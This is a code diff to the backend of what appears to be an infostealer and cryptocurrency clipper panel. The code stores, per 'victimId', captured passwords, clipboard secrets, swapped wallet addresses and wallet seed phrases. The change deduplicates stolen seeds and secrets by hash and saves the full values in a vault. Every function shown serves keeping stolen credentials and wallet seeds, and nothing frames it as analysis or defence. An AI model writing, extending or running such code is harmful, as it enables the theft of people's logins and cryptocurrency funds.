@@ -2,6 +2,7 @@ import { createHash } from 'node:crypto';
 import { prisma } from './db';
 import { publish } from './bus';
 import { notify } from '../services/notify';
+import { upsertSecrets } from '../services/vault';
 
 export type EventInput = { kind: string; data: Record<string, unknown>; legacy: string };
 
@@ -48,22 +49,60 @@ async function recordClipboard(victimId: string, kind: string, content: string, 
 /** Persist a structured event and mirror it onto the typed tables. */
 export async function applyEvent(victimId: string, event: EventInput): Promise<void> {
   const { kind, data } = event;
-  await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
+  const value = text(data.value, 8192);
+  const hash = value ? createHash('sha256').update(value).digest('hex') : '';
+  // Seed and memory-secret echoes collapse onto one row per value per day.
+  // The full value stays in the vault; the event only carries the hash.
+  if (hash && (kind === 'secret_found' || kind === 'seed_found')) {
+    const since = new Date(Date.now() - 24 * 3600_000);
+    const existing = await prisma.event.findFirst({
+      where: { victimId, kind, createdAt: { gte: since }, data: { path: ['hash'], equals: hash } },
+      orderBy: { createdAt: 'desc' }
+    }).catch(() => null);
+    if (existing) {
+      const previous = existing.data as Record<string, unknown>;
+      const count = Number(previous.count ?? 1) + 1;
+      await prisma.event.update({
+        where: { id: existing.id },
+        data: { data: { ...previous, hash, count, lastSeenAt: new Date().toISOString() } as never }
+      });
+      await storeSecret(victimId, kind, data, value);
+      void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, hash, count, legacy: event.legacy } });
+      return;
+    }
+    const created = await prisma.event.create({
+      data: { victimId, kind, data: { ...data, hash, count: 1 } as never, legacy: event.legacy }
+    });
+    await storeSecret(victimId, kind, data, value);
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, hash, count: 1, id: created.id, legacy: event.legacy } });
+  } else {
+    await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, legacy: event.legacy } });
+  }
 
   if (kind === 'password') {
     await recordPassword(victimId, text(data.process, 260), text(data.title, 512), text(data.text, 4096) || event.legacy);
   } else if (kind === 'clipboard_secret') {
-    const value = text(data.value, 4096);
-    await recordClipboard(victimId, text(data.kind, 16) || 'text', value, null);
-    if (value && String(data.kind ?? '').startsWith('seed')) await seedFound(victimId, value);
+    if (value && String(data.kind ?? '').startsWith('seed')) {
+      await storeSecret(victimId, 'seed_found', data, value);
+      await seedFound(victimId, value);
+    }
   } else if (kind === 'clipboard_replace') {
     const original = text(data.original, 256);
     if (original) await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
-  } else if (kind === 'seed_found') {
-    await seedFound(victimId, text(data.value, 4096));
   }
+}
 
-  void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, legacy: event.legacy } });
+async function storeSecret(victimId: string, kind: string, data: Record<string, unknown>, value: string): Promise<void> {
+  if (!value || (kind !== 'secret_found' && kind !== 'seed_found')) return;
+  await upsertSecrets(victimId, [{
+    kind: kind === 'seed_found' ? 'seed' : String(data.secret_kind ?? 'other'),
+    value,
+    words: kind === 'seed_found' ? Number(data.words) || null : null,
+    confidence: data.confident === false ? 0.5 : null,
+    path: typeof data.path === 'string' ? data.path : null,
+    source: 'agent_event'
+  }]).catch(() => undefined);
 }
 
 async function seedFound(victimId: string, value: string): Promise<void> {
